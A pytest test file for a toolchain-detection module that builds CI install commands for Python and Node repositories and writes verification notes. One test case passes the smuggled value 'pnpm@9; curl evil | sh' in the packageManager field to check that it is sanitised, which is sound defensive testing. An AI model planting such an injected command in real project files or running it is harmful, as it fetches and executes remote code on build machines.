import json
from pathlib import Path

import pytest

import sdlc_stage as s
from conftest import FEATURE


def project(root, files):
    for name, text in files.items():
        (root / name).write_text(text if isinstance(text, str) else json.dumps(text))
    return s.detect_toolchain(root)


def test_a_repository_with_nothing_yet_gets_python_and_pytest(tmp_path):
    tc = project(tmp_path, {})
    assert (tc["python"], tc["node"], tc["install"]) == (True, False, "")


@pytest.mark.parametrize("files, install", [
    ({"requirements.txt": ""}, "uv pip install -r requirements.txt"),
    ({"pyproject.toml": "", "requirements.txt": ""}, "uv pip install -e ."),
    ({"pyproject.toml": "", "requirements-dev.txt": ""}, "uv pip install -e . && uv pip install -r requirements-dev.txt"),
    ({"setup.py": ""}, ""),
])
def test_python(tmp_path, files, install):
    tc = project(tmp_path, files)
    assert (tc["python"], tc["node"], tc["install"]) == (True, False, install)


@pytest.mark.parametrize("lockfile, manager, install", [
    ("package-lock.json", "npm", "npm ci"),
    ("npm-shrinkwrap.json", "npm", "npm ci"),
    ("pnpm-lock.yaml", "pnpm", "npm install -g pnpm && pnpm install --frozen-lockfile"),
    ("yarn.lock", "yarn", s.YARN_INSTALL),
    (None, "npm", "npm install"),
])
def test_node_installs_with_its_lockfiles_package_manager(tmp_path, lockfile, manager, install):
    tc = project(tmp_path, {"package.json": {}, **({lockfile: ""} if lockfile else {})})
    assert (tc["python"], tc["node"], tc["manager"], tc["lockfile"], tc["install"]) == \
        (False, True, manager, lockfile or "", install)


@pytest.mark.parametrize("package_manager, pnpm", [
    ("pnpm@10.18.3", "pnpm@10.18.3"),
    ("pnpm@9.15.4+sha512.b2dc20e2fc72b3e18848459b37359a32064663e5627a51e4c74b2c29dd8e8e0491483c3abb40789cfd578bf362fb6ba8261b05f0387d76792ed6e23ea3b1b6a0", "pnpm@9.15.4"),
    ("pnpm@9; curl evil | sh", "pnpm"),
    ("yarn@4.5.0", "pnpm"),
])
def test_pnpm_comes_at_the_version_package_manager_pins(tmp_path, package_manager, pnpm):
    tc = project(tmp_path, {"package.json": {"packageManager": package_manager}, "pnpm-lock.yaml": ""})
    assert tc["install"] == f"npm install -g {pnpm} && pnpm install --frozen-lockfile"


def test_typescript_with_vitest_and_a_pinned_node(tmp_path):
    tc = project(tmp_path, {"package.json": {"devDependencies": {"typescript": "^5", "vitest": "^3"}},
                            "package-lock.json": "", "tsconfig.json": "{}", ".nvmrc": "22\n"})
    assert (tc["typescript"], tc["runner"], tc["node_version_file"]) == \
        (True, "npx vitest run <test file>", ".nvmrc")
    assert project(tmp_path, {"package.json": {"dependencies": {"jest": "1"}}})["runner"] == "npx jest <test file>"


def test_python_and_node_together(tmp_path):
    tc = project(tmp_path, {"requirements.txt": "", "package.json": {}, "package-lock.json": ""})
    assert (tc["python"], tc["node"], tc["install"]) == (True, True, "uv pip install -r requirements.txt && npm ci")


@pytest.mark.parametrize("text", ["not json", "[]", '{"devDependencies": ["vitest"]}'])
def test_a_broken_package_json_still_means_node(tmp_path, text):
    tc = project(tmp_path, {"package.json": text})
    assert (tc["node"], tc["runner"], tc["install"]) == (True, "", "npm install")


def outputs_of_toolchain(root, monkeypatch, tmp_path):
    out = tmp_path / "out"
    out.write_text("")
    monkeypatch.chdir(root)
    monkeypatch.setenv("GITHUB_OUTPUT", str(out))
    monkeypatch.setattr("sys.argv", ["sdlc_stage.py", "toolchain"])
    s.main()
    return dict(line.split("=", 1) for line in out.read_text().splitlines() if line)


def test_toolchain_command_sets_the_project_env_outputs(tmp_path, monkeypatch):
    root = tmp_path / "repo"
    root.mkdir()
    project(root, {"requirements.txt": "", "package.json": {}, "package-lock.json": ""})
    assert outputs_of_toolchain(root, monkeypatch, tmp_path) == {
        "python": "true", "node": "true", "stacks": "python node",
        "install": "uv pip install -r requirements.txt && npm ci",
        "node-version-file": "", "node-version": "lts/*", "node-cache": "npm"}
    project(root, {".nvmrc": "22\n", "pnpm-lock.yaml": ""})
    (root / "package-lock.json").unlink()
    got = outputs_of_toolchain(root, monkeypatch, tmp_path)
    assert (got["node-version-file"], got["node-version"], got["node-cache"]) == (".nvmrc", "", "")


def test_verification_notes(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    text = s.verification_notes("python -m pytest -q")
    assert text.startswith("The verify job sets up Python in a virtualenv that is on PATH, with pytest; "
                           "there is nothing to install yet.")
    assert "`python -m pytest -q`, which fails if it collects no tests" in text
    assert "`python -m pytest <test file> -v`" in text and "Node.js" not in text
    project(tmp_path, {"package.json": {"devDependencies": {"vitest": "3"}}, "package-lock.json": "",
                       "tsconfig.json": "{}"})
    text = s.verification_notes("npm test")
    assert "sets up Node.js (the latest LTS) with npm, then installs the project with `npm ci`." in text
    assert "`npx vitest run <test file>`" in text and "Python" not in text
    assert "`package-lock.json` changes with `package.json`" in text and "`npx tsc --noEmit`" in text
    assert "installs the project with `make deps`." in s.verification_notes("npm test", "make deps")


def test_the_plan_prompt_describes_the_repositorys_toolchain(repo, monkeypatch):
    (repo / "package.json").write_text('{"devDependencies": {"jest": "29"}}')
    monkeypatch.setenv("TEST_COMMAND", "npm test")
    monkeypatch.delenv("INSTALL_COMMAND", raising=False)
    folder = Path("sdlc/features", FEATURE)
    parts, _ = s.prompt_parts("plan", folder, {"package.json"}, 60000, "")
    notes = next(p for p in parts if p.startswith("## How verification runs\n"))
    assert "Node.js (the latest LTS) with npm" in notes and "`npm test`" in notes and "`npx jest <test file>`" in notes
